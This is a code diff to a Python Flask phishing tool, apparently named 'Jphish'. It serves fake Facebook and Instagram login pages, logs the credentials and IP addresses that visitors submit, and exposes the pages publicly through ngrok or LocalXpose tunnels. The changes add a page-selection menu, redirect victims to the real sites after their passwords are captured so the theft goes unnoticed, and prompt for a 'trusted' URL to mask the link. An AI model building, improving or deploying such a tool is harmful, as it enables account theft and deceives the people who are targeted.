@@ -1,9 +1,21 @@
 import os
 import subprocess
+import time
 from datetime import datetime
 from flask import Flask, request, render_template, redirect, url_for
 
 app = Flask(__name__)
+
+# ASCII Banner
+def show_banner():
+    print("""
+     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
+     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
+     ██║██████╔╝███████║██║███████╗███████║
+██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
+╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
+ ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
+    """)
 
 # Log credentials and sessions
 def log_credentials(username, password, service):
@@ -25,7 +37,7 @@ def facebook():
         username = request.form.get('email')
         password = request.form.get('pass')
         log_credentials(username, password, 'Facebook')
-        return redirect(url_for('success'))
+        return redirect("https://facebook.com")  # Redirect to real Facebook
     log_session(request.remote_addr, 'Facebook')
     return render_template('facebook.html')
 
@@ -35,29 +47,50 @@ def instagram():
         username = request.form.get('username')
         password = request.form.get('password')
         log_credentials(username, password, 'Instagram')
-        return redirect(url_for('success'))
+        return redirect("https://instagram.com")  # Redirect to real Instagram
     log_session(request.remote_addr, 'Instagram')
     return render_template('instagram.html')
 
-@app.route('/success')
-def success():
-    return render_template('success.html')
+# Check if Ngrok is running
+def is_ngrok_running():
+    try:
+        result = subprocess.check_output(["pgrep", "ngrok"])
+        return True
+    except subprocess.CalledProcessError:
+        return False
 
-# Start LocalXpose or Ngrok with interactive auth token input
-def start_tunnel():
-    print("\n=== Jphish Tunnel Setup ===")
-    use_localxpose = input("Use LocalXpose? (y/n): ").strip().lower() == 'y'
-    
+# Start Ngrok with error handling
+def start_ngrok(auth_token, port=8080):
+    try:
+        if not is_ngrok_running():
+            subprocess.Popen(["ngrok", "http", str(port), "--authtoken", auth_token, "--log=stdout"])
+            time.sleep(5)  # Wait for Ngrok to initialize
+            print("\n[+] Ngrok tunnel started successfully!")
+        else:
+            print("\n[!] Ngrok is already running.")
+    except Exception as e:
+        print(f"\n[!] Failed to start Ngrok: {e}")
+
+# Main setup
+def setup():
+    show_banner()
+    print("\n[+] Select Phishing Page:")
+    print("1. Facebook")
+    print("2. Instagram")
+    choice = input("\nEnter choice (1/2): ").strip()
+
+    use_localxpose = input("\nUse LocalXpose? (y/n): ").lower() == 'y'
+    masked_url = input("\nEnter URL to mask (e.g., https://trusted-site.com): ").strip()
+
     if use_localxpose:
-        localxpose_token = input("Enter your LocalXpose auth token: ").strip()
-        localxpose_domain = input("Enter your LocalXpose domain (e.g., yourdomain.com): ").strip()
-        subprocess.Popen(["localxpose", "http", "8080", "--to", localxpose_domain, "--auth", localxpose_token])
-        print(f"\n[+] LocalXpose tunnel started: https://{localxpose_domain}")
+        localxpose_token = input("\nLocalXpose Auth Token: ").strip()
+        subprocess.Popen(["localxpose", "http", "8080", "--to", masked_url, "--auth", localxpose_token])
     else:
-        ngrok_token = input("Enter your Ngrok auth token: ").strip()
-        subprocess.Popen(["ngrok", "http", "8080", "--authtoken", ngrok_token])
-        print("\n[+] Ngrok tunnel started. Check the Ngrok console for the public URL.")
+        ngrok_token = input("\nNgrok Auth Token: ").strip()
+        start_ngrok(ngrok_token)
+
+    print(f"\n[+] Phishing page active! Masked URL: {masked_url}")
 
 if __name__ == '__main__':
-    start_tunnel()
-    app.run(port=8080)
+    setup()
+    app.run(host='127.0.0.1', port=8080)
